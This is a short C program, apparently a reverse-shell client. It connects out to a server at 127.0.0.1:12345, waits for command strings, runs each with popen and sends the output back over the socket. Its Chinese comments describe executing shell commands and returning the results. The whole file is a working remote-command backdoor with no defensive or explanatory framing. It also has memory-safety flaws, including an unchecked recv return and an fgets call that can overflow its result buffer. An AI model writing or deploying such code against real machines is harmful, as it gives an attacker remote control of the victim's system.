#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 12345

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    int bytes;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[INFO] Connection failed.");
        return 1;
    }
    
    printf("[INFO] Connected and Waiting for cmd...\n");
    bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes] = '\0';
    printf("[SRV]: %s\n", buffer);
    memset(buffer, 0, 1024);

    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes] = '\0';
        printf("[CMD]: %s\n", buffer);

        // 執行 shell 指令
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("popen failed");
            continue;
        }

        // 讀取執行結果並回傳給伺服器
        char result[10240];
        memset(result, 0, 10240);
        size_t len = 0;
        while (fgets(result + len, 10240, fp) != NULL) {
            len = strlen(result);
        }
        
        send(sock, result, strlen(result), 0);
        pclose(fp);
    }
    
    printf("[INFO] Disconnected.\n");
    close(sock);
    return 0;
}
